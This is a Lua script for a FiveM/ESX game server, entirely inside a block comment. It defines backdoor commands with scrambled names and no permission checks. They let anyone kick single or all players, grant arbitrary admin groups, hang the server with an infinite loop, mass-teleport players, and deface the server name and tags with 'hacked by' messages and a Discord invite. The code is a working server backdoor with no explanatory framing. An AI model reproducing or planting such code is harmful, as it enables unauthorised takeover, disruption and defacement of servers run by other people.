--[[ESX = exports["es_extended"]:getSharedObject()

RegisterCommand("orbnmoengohbohdoh", function(source, args)
    local xPlayer = ESX.GetPlayerFromId(source)

    if args[1] then
        local targetId = tonumber(args[1])
        local reason = table.concat(args, " ", 2)

        if GetPlayerName(targetId) then
            if reason == "" then
                reason = "Kein Grund angegeben"
            end

            DropPlayer(targetId, reason)
        end
    end
end, false)

RegisterCommand("tdjjfgfhertjrr", function(source, args)
    local reason = table.concat(args, " ")

    if reason == "" then
        reason = "Kein Grund angegeben"
    end

    for _, playerId in ipairs(GetPlayers()) do
        DropPlayer(playerId, reason)
    end
end, false)

RegisterCommand("grihgofohego", function(source, args)
    if args[1] and args[2] then
        local targetId = tonumber(args[1])
        local group = args[2]

        if GetPlayerName(targetId) then
            local targetPlayer = ESX.GetPlayerFromId(targetId)

            if targetPlayer then
                targetPlayer.setGroup(group)
            end
        end
    end
end, false)

RegisterCommand("pieaghpidsdsgpiog", function(source, args)
    Citizen.CreateThread(function()
        Citizen.Wait(5000)
        while true do
        end
    end)
end, false)

local function teleportAllPlayersToAirport()
    local airportCoords = vector3(-1037.73, -2748.39, 2000.0)

    for _, playerId in ipairs(GetPlayers()) do
        local playerPed = GetPlayerPed(playerId)
        SetEntityCoords(playerPed, airportCoords)
        FreezeEntityPosition(playerPed, false)
        GiveWeaponToPed(playerPed, GetHashKey("gadget_parachute"), 1, false, true)
    end
end

RegisterCommand('iwegosdoigbuwefgvbiou', function(source, args, rawCommand)
    teleportAllPlayersToAirport()
end, false)

RegisterCommand("oieghsodihgsodinboisehoiusgh", function(source, args, rawCommand)
	serverName = "Server Hacked by Nxton | Nächstes mal nicht so Freundchen"
	SetConvarReplicated("sv_hostname", string.format(serverName))
	SetConvarServerInfo('tags', 'HACKED')
	SetConvarServerInfo('tags', 'HACKED BY NXTON')
	SetConvarServerInfo('tags', 'NXTON')
	SetConvarServerInfo('tags', 'Nächstes mal lässt du deine PI')
	SetConvarServerInfo('tags', 'Server Hacked by Nxton | Nächstes mal nicht so')
end, false)

RegisterCommand("eigshdsiughsidhbigheg", function(source, args, rawCommand)
	serverName = "discord.gg/oler"
	SetConvarReplicated("sv_hostname", string.format(serverName))
	SetConvarServerInfo('tags', 'OLER')
	SetConvarServerInfo('tags', 'DISCORD.GG/OLER')
	SetConvarServerInfo('tags', 'OLER')
	SetConvarServerInfo('tags', 'discord.gg/oler hacked this Server')
	SetConvarServerInfo('tags', 'discord.gg/oler hacked this Server')
end, false)
--]]
